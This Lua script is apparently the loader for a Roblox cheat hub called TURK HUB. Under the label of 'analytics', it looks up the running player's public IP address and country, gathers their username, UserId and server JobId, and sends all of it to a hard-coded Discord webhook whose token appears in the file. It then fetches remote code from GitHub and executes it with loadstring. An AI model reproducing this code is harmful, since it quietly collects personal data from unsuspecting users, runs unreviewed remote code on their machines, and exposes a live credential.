if getgenv().TURKHUB_LOADED then return end
getgenv().TURKHUB_LOADED = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer

-- LOADER
local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"

-- DISCORD WEBHOOK
local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"

-- COUNTERS
local TotalCounter = "https://api.countapi.xyz/hit/turkhub/total"
local TodayCounter = "https://api.countapi.xyz/hit/turkhub/today"
local GameCounter = "https://api.countapi.xyz/hit/turkhub/game_"

-- REQUEST
local request = syn and syn.request or http_request or request

-- GET IP
local function GetIP()

    local ip = "Unknown"

    pcall(function()
        ip = game:HttpGet("https://api.ipify.org")
    end)

    return ip
end

-- GET COUNTRY
local function GetCountry()

    local country = "Unknown"

    pcall(function()

        local data = game:HttpGet("http://ip-api.com/json")
        local decoded = HttpService:JSONDecode(data)

        country = decoded.country

    end)

    return country

end

-- GAME NAME
local function GetGameName()

    local name = "Unknown"

    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    return name

end

-- COUNTER
local function HitCounter(url)

    local value = "0"

    pcall(function()

        local data = game:HttpGet(url)
        local decoded = HttpService:JSONDecode(data)

        value = tostring(decoded.value)

    end)

    return value

end

-- SEND ANALYTICS
local function SendAnalytics()

    if not request then return end

    local ip = GetIP()
    local country = GetCountry()
    local gameName = GetGameName()

    local totalUsers = HitCounter(TotalCounter)
    local todayUsers = HitCounter(TodayCounter)
    local gameUses = HitCounter(GameCounter..game.PlaceId)

    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 TURK HUB EXECUTED",
            ["color"] = 65280,

            ["fields"] = {

                {
                    ["name"] = "👤 Player",
                    ["value"] = LocalPlayer.Name,
                    ["inline"] = true
                },

                {
                    ["name"] = "🆔 UserId",
                    ["value"] = tostring(LocalPlayer.UserId),
                    ["inline"] = true
                },

                {
                    ["name"] = "🌍 Country",
                    ["value"] = country,
                    ["inline"] = true
                },

                {
                    ["name"] = "🌐 IP",
                    ["value"] = ip,
                    ["inline"] = false
                },

                {
                    ["name"] = "🎮 Game",
                    ["value"] = gameName,
                    ["inline"] = false
                },

                {
                    ["name"] = "📌 PlaceId",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },

                {
                    ["name"] = "🖥 Server JobId",
                    ["value"] = game.JobId,
                    ["inline"] = false
                },

                {
                    ["name"] = "👥 Total Users",
                    ["value"] = totalUsers,
                    ["inline"] = true
                },

                {
                    ["name"] = "📅 Users Today",
                    ["value"] = todayUsers,
                    ["inline"] = true
                },

                {
                    ["name"] = "🔥 Game Uses",
                    ["value"] = gameUses,
                    ["inline"] = true
                }

            },

            ["footer"] = {
                ["text"] = "TURK HUB Analytics System"
            }

        }}
    }

    request({
        Url = AnalyticsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })

end

pcall(SendAnalytics)

-- LOAD HUB
loadstring(game:HttpGet(LoaderURL))()